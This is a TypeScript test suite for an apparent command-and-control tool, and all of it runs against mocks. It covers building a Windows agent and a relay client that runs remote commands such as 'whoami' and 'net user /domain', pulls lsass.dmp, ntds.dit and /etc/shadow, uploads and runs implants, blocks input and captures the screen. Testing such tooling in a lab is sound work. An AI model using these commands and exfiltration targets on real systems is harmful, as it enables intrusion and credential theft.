import { describe, it, expect, beforeEach } from "vitest";
import { CompileC2UseCase } from "../../../src/application/c2/use-cases/CompileC2UseCase.js";
import { C2Controller } from "../../../src/infra/controllers/C2Controller.js";
import { MockC2Compiler } from "../../mocks/MockC2Compiler.js";
import { MockC2RelayClient } from "../../mocks/MockC2RelayClient.js";
import { Result } from "../../../src/shared/Result.js";
import type { C2Event, C2Machine, C2FileEntry } from "../../../src/domain/ports/IC2RelayClient.js";

describe("CompileC2UseCase", () => {
  let compiler: MockC2Compiler;
  let useCase: CompileC2UseCase;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockC2Compiler();
    useCase = new CompileC2UseCase(compiler);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("returns binaryPath and buildId on successful compile", async () => {
    const result = await useCase.execute("ws://10.0.0.1:4444", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.binaryPath).toBe("/tmp/builds/123/c2_agent.exe");
    expect(result.value!.buildId).toBe("123");
  });

  it("passes the server URL through to the compiler port", async () => {
    await useCase.execute("wss://relay.corp.internal:8443/c2", onLog);

    expect(compiler.calls).toEqual(["wss://relay.corp.internal:8443/c2"]);
  });

  it("rejects plain text URL without scheme", async () => {
    const result = await useCase.execute("relay.local:4444", onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("URL inv");
  });

  it("rejects empty string URL", async () => {
    const result = await useCase.execute("", onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("URL inv");
  });

  it("rejects ftp:// scheme", async () => {
    const result = await useCase.execute("ftp://server.com:21", onLog);

    expect(result.isFailure).toBe(true);
    expect(compiler.calls).toHaveLength(0);
  });

  it("accepts http:// scheme for reverse-proxy scenarios", async () => {
    const result = await useCase.execute("http://proxy.local:8080/c2", onLog);

    expect(result.isSuccess).toBe(true);
    expect(compiler.calls).toEqual(["http://proxy.local:8080/c2"]);
  });

  it("accepts https:// scheme", async () => {
    const result = await useCase.execute("https://relay.example.com:443", onLog);

    expect(result.isSuccess).toBe(true);
  });

  it("logs starting message before compilation begins", async () => {
    await useCase.execute("ws://localhost:4444", onLog);

    expect(logs[0]).toContain("Iniciando compila");
    expect(logs[1]).toContain("ws://localhost:4444");
  });

  it("logs error message when compilation fails", async () => {
    compiler.result = Result.fail("mingw-w64 not found in container");

    await useCase.execute("ws://localhost:4444", onLog);

    expect(logs.some((l) => l.includes("Erro"))).toBe(true);
    expect(logs.some((l) => l.includes("mingw-w64"))).toBe(true);
  });

  it("logs build path on success", async () => {
    await useCase.execute("ws://localhost:4444", onLog);

    expect(logs.some((l) => l.includes("Build conclu"))).toBe(true);
    expect(logs.some((l) => l.includes("c2_agent.exe"))).toBe(true);
  });
});

describe("C2Controller", () => {
  let compiler: MockC2Compiler;
  let relay: MockC2RelayClient;
  let controller: C2Controller;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockC2Compiler();
    relay = new MockC2RelayClient();
    const useCase = new CompileC2UseCase(compiler);
    controller = new C2Controller(useCase, relay);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  it("exposes relay as a readonly property matching the injected instance", () => {
    expect(controller.relay).toBe(relay);
  });

  it("delegates compile to CompileC2UseCase and returns its result", async () => {
    const result = await controller.compile("ws://192.168.1.50:4444", onLog);

    expect(result.isSuccess).toBe(true);
    expect(result.value!.buildId).toBe("123");
    expect(compiler.calls).toEqual(["ws://192.168.1.50:4444"]);
  });

  it("propagates compile failure from the use case", async () => {
    compiler.result = Result.fail("Docker daemon not responding");

    const result = await controller.compile("ws://localhost:4444", onLog);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("Docker daemon");
  });

  it("propagates URL validation failure without invoking compiler", async () => {
    const result = await controller.compile("invalid-url", onLog);

    expect(result.isFailure).toBe(true);
    expect(compiler.calls).toHaveLength(0);
  });

  it("forwards all log messages through the onLog callback", async () => {
    await controller.compile("ws://localhost:4444", onLog);

    expect(logs.length).toBeGreaterThanOrEqual(2);
    expect(logs.every((l) => l.includes("[c2]"))).toBe(true);
  });

  it("provides relay.connect for establishing WS connection with token", async () => {
    await controller.relay.connect("ws://relay.local:4444", "secret-token");

    expect(relay.connectCalls).toEqual([
      { url: "ws://relay.local:4444", token: "secret-token" },
    ]);
    expect(relay.isConnected()).toBe(true);
  });

  it("provides relay.disconnect to tear down connection", async () => {
    await controller.relay.connect("ws://localhost:4444");
    controller.relay.disconnect();

    expect(relay.disconnectCalls).toBe(1);
    expect(relay.isConnected()).toBe(false);
  });

  it("provides relay.sendCommand to execute shell on remote machine", () => {
    controller.relay.sendCommand("m-abc", "whoami");
    controller.relay.sendCommand("m-abc", "ipconfig /all");

    expect(relay.commandCalls).toEqual([
      { machineId: "m-abc", command: "whoami" },
      { machineId: "m-abc", command: "ipconfig /all" },
    ]);
  });

  it("provides relay.fileList to browse remote filesystem", () => {
    controller.relay.fileList("m-abc", "C:\\Users\\Admin\\Desktop");

    expect(relay.fileListCalls).toEqual([
      { machineId: "m-abc", path: "C:\\Users\\Admin\\Desktop" },
    ]);
  });

  it("provides relay.fileDownload and fileUpload for file transfer", () => {
    controller.relay.fileDownload("m-abc", "C:\\lsass.dmp");
    controller.relay.fileUpload("m-abc", "C:\\implant.dll", "TVqQAAMAAAA=");

    expect(relay.fileDownloadCalls).toHaveLength(1);
    expect(relay.fileUploadCalls[0].data).toBe("TVqQAAMAAAA=");
  });
});

describe("IC2RelayClient contract", () => {
  let relay: MockC2RelayClient;

  beforeEach(() => {
    relay = new MockC2RelayClient();
  });

  it("starts in disconnected state", () => {
    expect(relay.isConnected()).toBe(false);
  });

  it("transitions to connected after connect()", async () => {
    await relay.connect("ws://localhost:4444");

    expect(relay.isConnected()).toBe(true);
  });

  it("transitions back to disconnected after disconnect()", async () => {
    await relay.connect("ws://localhost:4444");
    relay.disconnect();

    expect(relay.isConnected()).toBe(false);
  });

  it("records connect calls with URL and optional token", async () => {
    await relay.connect("ws://10.0.0.1:4444", "tok-123");
    await relay.connect("ws://10.0.0.2:4444");

    expect(relay.connectCalls).toEqual([
      { url: "ws://10.0.0.1:4444", token: "tok-123" },
      { url: "ws://10.0.0.2:4444", token: undefined },
    ]);
  });

  it("sendCommand records machine ID and command string", () => {
    relay.sendCommand("m1", "net user /domain");

    expect(relay.commandCalls[0]).toEqual({
      machineId: "m1",
      command: "net user /domain",
    });
  });

  it("fileList records machine ID and remote path", () => {
    relay.fileList("m1", "C:\\Windows\\System32");

    expect(relay.fileListCalls[0]).toEqual({
      machineId: "m1",
      path: "C:\\Windows\\System32",
    });
  });

  it("fileDownload records machine ID and path to exfiltrate", () => {
    relay.fileDownload("m1", "C:\\Users\\Admin\\ntds.dit");

    expect(relay.fileDownloadCalls[0].path).toBe("C:\\Users\\Admin\\ntds.dit");
  });

  it("fileUpload records machine ID, path and base64 data", () => {
    relay.fileUpload("m1", "C:\\Windows\\Temp\\stage2.exe", "UEsDBBQAAAA=");

    expect(relay.fileUploadCalls[0]).toEqual({
      machineId: "m1",
      path: "C:\\Windows\\Temp\\stage2.exe",
      data: "UEsDBBQAAAA=",
    });
  });

  it("fileExec records machine ID and path of binary to execute", () => {
    relay.fileExec("m1", "C:\\Windows\\Temp\\stage2.exe");

    expect(relay.fileExecCalls[0]).toEqual({
      machineId: "m1",
      path: "C:\\Windows\\Temp\\stage2.exe",
    });
  });

  it("blockInput records machine ID", () => {
    relay.blockInput("m1");
    relay.blockInput("m2");

    expect(relay.blockInputCalls).toEqual(["m1", "m2"]);
  });

  it("unblockInput records machine ID", () => {
    relay.unblockInput("m1");

    expect(relay.unblockInputCalls).toEqual(["m1"]);
  });

  it("screenStart records machine ID and optional fps", () => {
    relay.screenStart("m1", 30);
    relay.screenStart("m2");

    expect(relay.screenStartCalls).toEqual([
      { machineId: "m1", fps: 30 },
      { machineId: "m2", fps: undefined },
    ]);
  });

  it("screenStop records machine ID", () => {
    relay.screenStop("m1");

    expect(relay.screenStopCalls).toEqual(["m1"]);
  });

  it("listMachines increments counter on each call", () => {
    relay.listMachines();
    relay.listMachines();
    relay.listMachines();

    expect(relay.listMachinesCalls).toBe(3);
  });

  it("delivers welcome event with initial machine list to listener", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    const machines: C2Machine[] = [
      { id: "m1", name: "DC-01", os: "Windows Server 2022", ip: "10.0.0.5", connected_at: "2026-04-10T08:00:00Z" },
    ];
    relay.simulateEvent({ type: "welcome", machines });

    expect(events).toHaveLength(1);
    if (events[0].type === "welcome") {
      expect(events[0].machines[0].name).toBe("DC-01");
    }
  });

  it("delivers machines event with updated list", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "machines", list: [] });

    expect(events[0].type).toBe("machines");
    if (events[0].type === "machines") {
      expect(events[0].list).toEqual([]);
    }
  });

  it("delivers machine_connected event with full machine info", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    const m: C2Machine = { id: "m5", name: "WORKSTATION-7", os: "Windows 11", ip: "192.168.1.107", connected_at: "2026-04-10T14:30:00Z" };
    relay.simulateEvent({ type: "machine_connected", machine: m });

    if (events[0].type === "machine_connected") {
      expect(events[0].machine.os).toBe("Windows 11");
    }
  });

  it("delivers machine_disconnected event with only machine_id", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "machine_disconnected", machine_id: "m5" });

    if (events[0].type === "machine_disconnected") {
      expect(events[0].machine_id).toBe("m5");
    }
  });

  it("delivers cmd_result event with command output from agent", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "cmd_result", machine_id: "m1", output: "nt authority\\system\n" });

    if (events[0].type === "cmd_result") {
      expect(events[0].output).toContain("system");
      expect(events[0].machine_id).toBe("m1");
    }
  });

  it("delivers file_list_result event with directory entries", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    const entries: C2FileEntry[] = [
      { name: "Windows", dir: true, size: 0 },
      { name: "pagefile.sys", dir: false, size: 4294967296 },
    ];
    relay.simulateEvent({ type: "file_list_result", machine_id: "m1", path: "C:\\", entries });

    if (events[0].type === "file_list_result") {
      expect(events[0].entries).toHaveLength(2);
      expect(events[0].path).toBe("C:\\");
    }
  });

  it("delivers file_data event with download content", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "file_data", machine_id: "m1", path: "C:\\flag.txt", data: "Q1RGe2ZsYWd9", size: 10 });

    if (events[0].type === "file_data") {
      expect(events[0].data).toBe("Q1RGe2ZsYWd9");
      expect(events[0].size).toBe(10);
    }
  });

  it("delivers file_upload_result event indicating success", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "file_upload_result", machine_id: "m1", ok: true, path: "C:\\implant.dll" });

    if (events[0].type === "file_upload_result") {
      expect(events[0].ok).toBe(true);
      expect(events[0].path).toBe("C:\\implant.dll");
    }
  });

  it("delivers file_exec_result event with execution output", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "file_exec_result", machine_id: "m1", ok: true, output: "Process started PID 1234" });

    if (events[0].type === "file_exec_result") {
      expect(events[0].output).toContain("PID 1234");
    }
  });

  it("delivers input_status event reflecting block state", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "input_status", machine_id: "m1", blocked: true });

    if (events[0].type === "input_status") {
      expect(events[0].blocked).toBe(true);
    }
  });

  it("delivers screen_frame event with JPEG base64 data", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "screen_frame", machine_id: "m1", data: "/9j/4AAQSkZJRgABAQ==" });

    if (events[0].type === "screen_frame") {
      expect(events[0].data).toContain("/9j/");
    }
  });

  it("delivers error event with descriptive message", () => {
    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.simulateEvent({ type: "error", error: "Unauthorized: invalid token" });

    if (events[0].type === "error") {
      expect(events[0].error).toContain("Unauthorized");
    }
  });

  it("broadcasts events to multiple listeners simultaneously", () => {
    const a: C2Event[] = [];
    const b: C2Event[] = [];
    const c: C2Event[] = [];
    relay.onEvent((e) => a.push(e));
    relay.onEvent((e) => b.push(e));
    relay.onEvent((e) => c.push(e));

    relay.simulateEvent({ type: "machines", list: [] });

    expect(a).toHaveLength(1);
    expect(b).toHaveLength(1);
    expect(c).toHaveLength(1);
  });

  it("unsubscribe stops a specific listener while others continue", () => {
    const kept: C2Event[] = [];
    const removed: C2Event[] = [];

    relay.onEvent((e) => kept.push(e));
    const unsub = relay.onEvent((e) => removed.push(e));

    relay.simulateEvent({ type: "machines", list: [] });
    unsub();
    relay.simulateEvent({ type: "machines", list: [] });

    expect(kept).toHaveLength(2);
    expect(removed).toHaveLength(1);
  });

  it("reset clears all state including listeners and connection", async () => {
    await relay.connect("ws://localhost:4444", "token");
    relay.sendCommand("m1", "whoami");
    relay.fileList("m1", "/");
    relay.fileDownload("m1", "/etc/shadow");
    relay.fileUpload("m1", "/tmp/x", "data");
    relay.fileExec("m1", "/tmp/x");
    relay.blockInput("m1");
    relay.unblockInput("m1");
    relay.screenStart("m1", 10);
    relay.screenStop("m1");
    relay.listMachines();

    const events: C2Event[] = [];
    relay.onEvent((e) => events.push(e));

    relay.reset();

    relay.simulateEvent({ type: "machines", list: [] });
    expect(events).toHaveLength(0);

    expect(relay.isConnected()).toBe(false);
    expect(relay.connectCalls).toHaveLength(0);
    expect(relay.commandCalls).toHaveLength(0);
    expect(relay.fileListCalls).toHaveLength(0);
    expect(relay.fileDownloadCalls).toHaveLength(0);
    expect(relay.fileUploadCalls).toHaveLength(0);
    expect(relay.fileExecCalls).toHaveLength(0);
    expect(relay.blockInputCalls).toHaveLength(0);
    expect(relay.unblockInputCalls).toHaveLength(0);
    expect(relay.screenStartCalls).toHaveLength(0);
    expect(relay.screenStopCalls).toHaveLength(0);
    expect(relay.listMachinesCalls).toBe(0);
  });
});
